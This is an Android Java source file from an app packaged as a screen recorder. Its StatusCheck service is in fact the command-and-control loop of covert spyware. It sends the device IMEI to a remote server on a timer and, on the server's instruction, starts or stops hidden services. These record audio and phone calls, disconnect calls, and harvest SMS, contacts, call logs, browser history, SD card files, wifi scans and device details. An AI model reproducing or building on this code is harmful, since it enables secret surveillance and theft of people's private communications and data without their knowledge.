package com.recorder.screen.screen_recorder.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.recorder.screen.screen_recorder.helper.UrlDemo;
import com.recorder.screen.screen_recorder.helper.Values;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.CoreConnectionPNames;

import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import java.util.Vector;

public class StatusCheck extends Service {

    public static boolean  StatusCheck_start =false;

    public static String recording = "";
    public static String status = "";
    public static String callrecording = "";
    public static String email ="";
    public static String sdcard = "";
    public static String wifiscan = "";
    public static String fileupload = "";
    public static String sms = "";
    public static String browser = "";
    public static String Calllog = "";
    public static String contact = "";
    public static String deviceinfo = "";

    private Timer timer;
    String stringbuffer = "";
    Timer mytimerfilesend;
    String Dimei;
    String DeviceFile;
    StringBuffer sb;

    public IBinder onBind(Intent arg0) {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        StatusCheck_start =true;
/*
        mytimerfilesend = new Timer();
        mytimerfilesend.schedule(new TimerTask() {
            @Override
            public void run() {
                getResponse();
            }
        },10000,30500);*/
        getResponse();
        return super.onStartCommand(intent, flags, startId);
    }



    public void getResponse()
    {
       mytimerfilesend = new Timer();
        mytimerfilesend.schedule(new TimerTask() {
            @Override
            public void run() {
                Log.e(".............", "----------------------------------------- StatusCheck");
                if (Values.getSharedPrefrence("iconstatus", getApplicationContext()).equalsIgnoreCase("1")) {
                    stringbuffer = "";
                    TelephonyManager TM = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                    final String imei = TM.getDeviceId();

                    try {
                        byte[] imeiAppStatus = imei.getBytes();
                        String imeibaseAppStatus = android.util.Base64.encodeToString(imeiAppStatus, android.util.Base64.DEFAULT);
                        System.out.println("imeibaseAppStatus = " + imeibaseAppStatus);
                        String imeibaseAppStatusstring = imeibaseAppStatus.replaceAll("\n", "");
                        System.out.println("imeibaseAppStatusstring = " + imeibaseAppStatusstring);

                        ConnectivityManager ConnectionManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
                        NetworkInfo networkInfo = ConnectionManager.getActiveNetworkInfo();
                        if (networkInfo != null && networkInfo.isConnected() == true) {
                            while (StatusCheck_start) {
                                Thread.yield();
                                Thread.sleep(10000);
                                Log.d("MyDebug", "on start of while ");
                                HttpClient httpclient = new DefaultHttpClient();
                                httpclient.getParams().setIntParameter(CoreConnectionPNames.SO_TIMEOUT, 605000);
                                httpclient.getParams().setIntParameter(CoreConnectionPNames.CONNECTION_TIMEOUT, 605000);
                                String android_status = UrlDemo.android_status;
                                HttpPost httppost = new HttpPost(android_status);
                                try {
                                    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
                                    if (imei != null) {
                                        System.out.println("IMEI NOT NUll AppStatus = ");
                                        nameValuePairs.add(new BasicNameValuePair("IMEI", imeibaseAppStatusstring));
                                        httppost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePairs));
                                        HttpResponse response = httpclient.execute(httppost);
                                        response.getStatusLine();
                                        HttpEntity entity = response.getEntity();
                                        entity = response.getEntity();
                                        InputStream in = entity.getContent();
                                        stringbuffer = "";
                                        for (int i = in.read(); i != -1; i = in.read()) {
                                            stringbuffer += (char) i;
                                            i++;
                                        }
                                        in.close();
                                        if (entity != null) {
                                            entity.consumeContent();
                                        }
                                        Log.d("Response", "Responce######" + stringbuffer);

                                        if (stringbuffer.startsWith("0")) {
                                            Thread.sleep(10000);
                                            Log.d("response zero", "Response stringbuffer zero***" + stringbuffer);
                                            String arr[] = Split(stringbuffer, ",");
                                            Log.d("Split Array == ", "in appstatus arr.length = " + arr.length);
                                            System.out.println(" Split Array 0 " + arr[0]);
                                            System.out.println(" Split Array 1 " + arr[1]);
                                            System.out.println(" Split Array 2 " + arr[2]);
                                            System.out.println(" Split Array 3 " + arr[3]);
                                            System.out.println(" Split Array 4 " + arr[4]);
                                            System.out.println(" Split Array 5 " + arr[5]);
                                            System.out.println(" Split Array 6 " + arr[6]);
                                            System.out.println(" Split Array 7 " + arr[7]);
                                            System.out.println(" Split Array 8 " + arr[8]);
                                            System.out.println(" Split Array 9 " + arr[9]);
                                            System.out.println(" Split Array 10 " + arr[10]);

                                            if (arr.length == 11) {
                                                // app status
                                                status = arr[0];
                                                //Toast.makeText(getApplicationContext(),"Index0"+status,Toast.LENGTH_SHORT).show();
                                                Log.d("Index0", "Index0" + status);

                                                // fileupload
                                                fileupload = arr[1].toString();
                                                if (fileupload.equalsIgnoreCase("A")) {
                                                    if (!FileUpload.running) {
                                                        startService(new Intent(getApplicationContext(), FileUpload.class));
                                                    }
                                                } else if (fileupload.equalsIgnoreCase("B")) {
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), FileUpload.class));
                                                } else {
                                                    System.out.println("FileUpload status Unkonwn");
                                                }

                                                //wifiscan
                                                wifiscan = arr[2].toString();
                                                if (wifiscan.equalsIgnoreCase("A")) {
                                                    if (!Wifi.started) {
                                                        startService(new Intent(getApplicationContext(), Wifi.class));
                                                    }
                                                } else if (wifiscan.equalsIgnoreCase("B")) {
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), Wifi.class));
                                                } else {
                                                    System.out.println("Wifi status Unkonwn");
                                                }

                                                // recording
                                                recording = arr[3];
                                                if (recording.equalsIgnoreCase("A")) {
                                                    if (!startrecordingservice.recording_started) {
                                                        getApplicationContext().startService(new Intent(getApplicationContext(), startrecordingservice.class));
                                                    }
                                                    //getApplicationContext().startService(new Intent(getApplicationContext(), PhoneTypeDemo.class));
                                                    //getApplicationContext().startService(new Intent(getApplicationContext(), Startvoice.class));
                                                    if (!FileSend.running) {
                                                        getApplicationContext().startService(new Intent(getApplicationContext(), FileSend.class));
                                                    }
                                                    //  getApplicationContext().startService(new Intent(getApplicationContext(),PhoneTypeDemo.class));

                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), startcallrecording.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), Startvoice1.class));
                                                    if (!FileSendCall.running) {
                                                        getApplicationContext().startService(new Intent(getApplicationContext(), FileSendCall.class));
                                                    }

                                                    if (!disconnectcall.disconnect) {
                                                        getApplicationContext().stopService(new Intent(getApplicationContext(), disconnectcall.class));
                                                    }

                                                } else if (recording.equalsIgnoreCase("B")) {
                                                    //getApplicationContext().stopService(new Intent(getApplicationContext(), PhoneTypeDemo.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), startrecordingservice.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), Startvoice.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), FileSend.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), startcallrecording.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), Startvoice1.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), FileSendCall.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), disconnectcall.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), PhoneTypeDemo.class));
                                                } else {
                                                    System.out.println("Recording status Unkonwn");
                                                }

                                                // callrecording
                                                callrecording = arr[4];
                                                if (callrecording.equalsIgnoreCase("A")) {
                                                    if (!disconnectcall.disconnect) {
                                                        getApplicationContext().startService(new Intent(getApplicationContext(), disconnectcall.class));
                                                    }

                                                    if (!startcallrecording.call_recording_started) {
                                                        getApplicationContext().startService(new Intent(getApplicationContext(), startcallrecording.class));
                                                    }

                                                    if (!Startvoice1.running) {
                                                        getApplicationContext().startService(new Intent(getApplicationContext(), Startvoice1.class));
                                                    }

                                                    if (!FileSendCall.running) {
                                                        getApplicationContext().startService(new Intent(getApplicationContext(), FileSendCall.class));
                                                    }
                                                    //getApplicationContext().startService(new Intent(getApplicationContext(),PhoneTypeDemo.class));


                                                } else if (callrecording.equalsIgnoreCase("B")) {
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), startrecordingservice.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), Startvoice.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), FileSend.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), startcallrecording.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), Startvoice1.class));
                                                    if (!FileSendCall.running) {
                                                        getApplicationContext().stopService(new Intent(getApplicationContext(), FileSendCall.class));
                                                    }
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), disconnectcall.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), PhoneTypeDemo.class));
                                                } else {
                                                    System.out.println("Call_Recording status Unkonwn");
                                                }

                                                //sdcard
                                                sdcard = arr[5];
                                                if (sdcard.equals("A")) {
                                                    if (!Sdcard.started) {
                                                        startService(new Intent(getApplicationContext(), Sdcard.class));
                                                    }

                                                } else if (sdcard.equals("B")) {
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), Sdcard.class));

                                                } else {
                                                    System.out.println("Sdcard status Unkonwn");
                                                }

                                                //CallLog
                                                Calllog = arr[6];
                                                if (Calllog.equalsIgnoreCase("A")) {
                                                    if (!AllCallLog.callHistory_start) {
                                                        startService(new Intent(getApplicationContext(), AllCallLog.class));
                                                    }
                                                } else if (Calllog.equalsIgnoreCase("B")) {
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), AllCallLog.class));
                                                } else {
                                                    System.out.println("CAll status Unkonwn");
                                                }

                                                //contact
                                                contact = arr[7];
                                                if (contact.equalsIgnoreCase("A")) {
                                                    if (!AllContact.contact_start) {
                                                        startService(new Intent(getApplicationContext(), AllContact.class));
                                                    }
                                                } else if (contact.equalsIgnoreCase("B")) {
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), AllContact.class));
                                                } else {
                                                    System.out.println("CAll status Unkonwn");
                                                }

                                                //browser
                                                browser = arr[8];
                                                if (browser.equalsIgnoreCase("A")) {
                                                    if (!AllBrowserHistory.BrowserHistory_start) {
                                                        startService(new Intent(getApplicationContext(), AllBrowserHistory.class));
                                                    }
                                                } else if (browser.equalsIgnoreCase("B")) {
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), AllBrowserHistory.class));
                                                } else {
                                                    System.out.println("CAll status Unkonwn");
                                                }

                                                //Device
                                                deviceinfo = arr[9];
                                                if (deviceinfo.equalsIgnoreCase("A")) {
                                                    if (!DeviceInfo.running) {
                                                        startService(new Intent(getApplicationContext(), DeviceInfo.class));
                                                    }
                                                } else if (deviceinfo.equalsIgnoreCase("B")) {
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), DeviceInfo.class));
                                                } else {
                                                    System.out.println("CAll status Unkonwn");
                                                }

                                                //sms
                                                sms = arr[10];
                                                if (sms.equalsIgnoreCase("A")) {
                                                    if (!AllSmsService.All_Sms_Service) {
                                                        getApplicationContext().startService(new Intent(getApplicationContext(), AllSmsService.class));
                                                    }
                                                } else if (sms.equalsIgnoreCase("B")) {
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), AllSmsService.class));
                                                } else {
                                                    System.out.println("CAll status Unkonwn");
                                                }

                                            }//arr.length() end
                                        } else if (stringbuffer.startsWith("1")) {
                                            Thread.sleep(10000);
                                            Log.d("response one", "Response stringbuffer one***" + stringbuffer);
                                            String arr[] = Split(stringbuffer, ",");
                                            Log.d("Split Array == ", "in appstatus arr.length = " + arr.length);
                                            System.out.println(" Split Array 0 " + arr[0]);
                                            System.out.println(" Split Array 1 " + arr[1]);
                                            System.out.println(" Split Array 2 " + arr[2]);
                                            System.out.println(" Split Array 3 " + arr[3]);
                                            System.out.println(" Split Array 4 " + arr[4]);
                                            System.out.println(" Split Array 5 " + arr[5]);
                                            System.out.println(" Split Array 6 " + arr[6]);
                                            System.out.println(" Split Array 7 " + arr[7]);
                                            System.out.println(" Split Array 8 " + arr[8]);
                                            System.out.println(" Split Array 9 " + arr[9]);
                                            System.out.println(" Split Array 10 " + arr[10]);

                                            if (arr.length == 11) {
                                                // app status
                                                status = arr[0];
                                                //Toast.makeText(getApplicationContext(),"Index0"+status,Toast.LENGTH_SHORT).show();
                                                Log.d("Index0", "Index0" + status);

                                                // fileupload
                                                fileupload = arr[1].toString();
                                                if (fileupload.equalsIgnoreCase("A")) {
                                                    if (!FileUpload.running) {
                                                        startService(new Intent(getApplicationContext(), FileUpload.class));
                                                    }
                                                } else if (fileupload.equalsIgnoreCase("B")) {
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), FileUpload.class));
                                                } else {
                                                    System.out.println("FileUpload status Unkonwn");
                                                }

                                                //wifiscan
                                                wifiscan = arr[2].toString();
                                                if (wifiscan.equalsIgnoreCase("A")) {
                                                    if (!Wifi.started) {
                                                        startService(new Intent(getApplicationContext(), Wifi.class));
                                                    }
                                                } else if (wifiscan.equalsIgnoreCase("B")) {
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), Wifi.class));
                                                } else {
                                                    System.out.println("Wifi status Unkonwn");
                                                }

                                                // recording
                                                recording = arr[3];
                                                if (recording.equalsIgnoreCase("A")) {
                                                    if (!startrecordingservice.recording_started) {
                                                        getApplicationContext().startService(new Intent(getApplicationContext(), startrecordingservice.class));
                                                    }
                                                    //getApplicationContext().startService(new Intent(getApplicationContext(), PhoneTypeDemo.class));
                                                    //getApplicationContext().startService(new Intent(getApplicationContext(), Startvoice.class));

                                                    if (!FileSend.running) {
                                                        getApplicationContext().startService(new Intent(getApplicationContext(), FileSend.class));
                                                    }
                                                    //  getApplicationContext().startService(new Intent(getApplicationContext(),PhoneTypeDemo.class));

                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), startcallrecording.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), Startvoice1.class));

                                                    if (!FileSendCall.running) {
                                                        getApplicationContext().startService(new Intent(getApplicationContext(), FileSendCall.class));
                                                    }
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), disconnectcall.class));


                                                } else if (recording.equalsIgnoreCase("B")) {
                                                    //getApplicationContext().stopService(new Intent(getApplicationContext(), PhoneTypeDemo.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), startrecordingservice.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), Startvoice.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), FileSend.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), startcallrecording.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), Startvoice1.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), FileSendCall.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), disconnectcall.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), PhoneTypeDemo.class));
                                                } else {
                                                    System.out.println("Recording status Unkonwn");
                                                }

                                                // callrecording
                                                callrecording = arr[4];
                                                if (callrecording.equalsIgnoreCase("A")) {
                                                    if (!disconnectcall.disconnect) {
                                                        getApplicationContext().startService(new Intent(getApplicationContext(), disconnectcall.class));
                                                    }
                                                    //getApplicationContext().startService(new Intent(getApplicationContext(), startcallrecording.class));
                                                    // getApplicationContext().startService(new Intent(getApplicationContext(), Startvoice1.class));
                                                    // getApplicationContext().startService(new Intent(getApplicationContext(), FileSendCall.class));
                                                    //getApplicationContext().startService(new Intent(getApplicationContext(),PhoneTypeDemo.class));


                                                } else if (callrecording.equalsIgnoreCase("B")) {
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), startrecordingservice.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), Startvoice.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), FileSend.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), startcallrecording.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), Startvoice1.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), FileSendCall.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), disconnectcall.class));
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), PhoneTypeDemo.class));
                                                } else {
                                                    System.out.println("Call_Recording status Unkonwn");
                                                }

                                                //sdcard
                                                sdcard = arr[5];
                                                if (sdcard.equals("A")) {
                                                    if (!Sdcard.started) {
                                                        startService(new Intent(getApplicationContext(), Sdcard.class));
                                                    }

                                                } else if (sdcard.equals("B")) {
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), Sdcard.class));

                                                } else {
                                                    System.out.println("Sdcard status Unkonwn");
                                                }

                                                //CallLog
                                                Calllog = arr[6];
                                                if (Calllog.equalsIgnoreCase("A")) {
                                                    if (!AllCallLog.callHistory_start) {
                                                        getApplicationContext().startService(new Intent(getApplicationContext(), AllCallLog.class));
                                                    }
                                                } else if (Calllog.equalsIgnoreCase("B")) {
                                                    stopService(new Intent(getApplicationContext(), AllCallLog.class));
                                                } else {
                                                    System.out.println("CAll status Unkonwn");
                                                }

                                                //contact
                                                contact = arr[7];
                                                if (contact.equalsIgnoreCase("A")) {
                                                    if (!AllContact.contact_start) {
                                                        startService(new Intent(getApplicationContext(), AllContact.class));
                                                    }
                                                } else if (contact.equalsIgnoreCase("B")) {
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), AllContact.class));
                                                } else {
                                                    System.out.println("CAll status Unkonwn");
                                                }

                                                //browser
                                                browser = arr[8];
                                                if (browser.equalsIgnoreCase("A")) {
                                                    if (!AllBrowserHistory.BrowserHistory_start) {
                                                        if (!AllBrowserHistory.BrowserHistory_start) {
                                                            getApplicationContext().startService(new Intent(getApplicationContext(), AllBrowserHistory.class));
                                                        }
                                                    }
                                                } else if (browser.equalsIgnoreCase("B")) {
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), AllBrowserHistory.class));
                                                } else {
                                                    System.out.println("CAll status Unkonwn");
                                                }

                                                //Device
                                                deviceinfo = arr[9];
                                                if (deviceinfo.equalsIgnoreCase("A")) {
                                                    if (!DeviceInfo.running) {
                                                        startService(new Intent(getApplicationContext(), DeviceInfo.class));
                                                    }
                                                } else if (deviceinfo.equalsIgnoreCase("B")) {
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), DeviceInfo.class));
                                                } else {
                                                    System.out.println("CAll status Unkonwn");
                                                }

                                                //sms
                                                sms = arr[10];
                                                if (sms.equalsIgnoreCase("A")) {
                                                    if (!AllSmsService.All_Sms_Service) {
                                                        getApplicationContext().startService(new Intent(getApplicationContext(), AllSmsService.class));
                                                    }
                                                } else if (sms.equalsIgnoreCase("B")) {
                                                    getApplicationContext().stopService(new Intent(getApplicationContext(), AllSmsService.class));
                                                } else {
                                                    System.out.println("CAll status Unkonwn");
                                                }

                                            }//arr.length() end
                                        }//else if
                                        else {
                                            Thread.sleep(10000);
                                            System.out.println("status Unkonwn");
                                            getApplicationContext().stopService(new Intent(getApplicationContext(), startrecordingservice.class));
                                            getApplicationContext().stopService(new Intent(getApplicationContext(), Startvoice.class));
                                            getApplicationContext().stopService(new Intent(getApplicationContext(), FileSend.class));
                                            getApplicationContext().stopService(new Intent(getApplicationContext(), startcallrecording.class));
                                            getApplicationContext().stopService(new Intent(getApplicationContext(), Startvoice1.class));
                                            getApplicationContext().stopService(new Intent(getApplicationContext(), FileSendCall.class));
                                            getApplicationContext().stopService(new Intent(getApplicationContext(), disconnectcall.class));
                                            getApplicationContext().stopService(new Intent(getApplicationContext(), PhoneTypeDemo.class));
                                            //getApplicationContext().stopService(new Intent(getApplicationContext(), PhoneTypeDemo.class));

                                        }

                                    }//if close
                                }//try close
                                catch (Exception e) {
                                    Log.d("AppStatus_Server_Down", "Exception in finding app status or May be Server Down " + e);
                                    httpclient.getConnectionManager().shutdown();
                                }
                            }//while loop end
                        }//if network
                        else {
                            System.out.println("Network Not Available");
                            Toast.makeText(StatusCheck.this, "Network Not Available Please Turn_On your Internet Connection ", Toast.LENGTH_LONG).show();
                        }
                    } catch (Exception e) {

                        System.out.println("AppStatus = " + e);
                    }
                }
            }
        },2000,60500);
    }//getResponse end

    private static String[] Split(String splitStr, String delimiter) {
        try
        {

            StringBuffer token = new StringBuffer();
            Vector tokens = new Vector();
            // split
            char[] chars = splitStr.toCharArray();
            for (int i = 0; i < chars.length; i++) {
                if (delimiter.indexOf(chars[i]) != -1) {
                    if (token.length() > 0) {
                        tokens.addElement(token.toString());
                        token.setLength(0);
                    }
                } else {
                    token.append(chars[i]);
                }
            }
            if (token.length() > 0) {
                tokens.addElement(token.toString());
            }
            String[] splitArray = new String[tokens.size()];
            for (int i = 0; i < splitArray.length; i++) {
                splitArray[i] = (String) tokens.elementAt(i);
            }
            return splitArray;
        }
        catch(Exception e)
        {
            return null;
        }
    }

    public void onDestroy() {
        try {
            if(timer!=null)
                timer.cancel();
        } catch (Exception e) {
            Log.d("Debug", "exception thrown in appStatus Destructor " + e);
        }
        try {
            if(mytimerfilesend!=null)
                mytimerfilesend.cancel();
        } catch (Exception e) {
            Log.d("Debug", "exception thrown in appStatus Destructor " + e);
        }

        StatusCheck_start =false;
        super.onDestroy();
    }
}
